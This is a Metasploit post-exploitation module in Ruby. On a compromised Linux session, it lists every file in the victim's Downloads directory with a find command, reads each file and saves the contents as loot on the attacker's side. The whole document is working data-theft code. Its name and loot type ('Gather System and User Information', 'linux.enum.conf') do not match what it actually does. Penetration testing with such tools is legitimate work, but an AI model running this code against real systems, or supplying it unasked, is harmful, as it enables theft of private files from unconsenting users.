##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Gather System and User Information',
      'Description'   => %q{
        This module lists downloads in the download directory, and sends them to the loot folder in /msf4.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Liana Villafuerte <lvillafuerte2018[at]my.fit.edu>',
          'Kourtnee Fernalld <kfernalld2018[at]my.fit.edu>',
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  def run

    folder = execute("/bin/find ~/Downloads/ -type f -name \"*\"").split("\n")
    #does not work for double extensions like .tar.gz
    folder.each do |f|
      print_status(f)
      output=read_file(f).to_s
      save(f, output)
    end
    
  end

  def save(file, data, ctype='')
    ltype = 'linux.enum.conf'
    fname = ::File.basename(file)
    loot = store_loot(ltype, ctype, session, data, fname)
    print_good("#{fname} stored in #{loot}")
  end

  def execute(cmd)
    vprint_status("Execute: #{cmd}")
    output = cmd_exec(cmd)
    output
  end
end
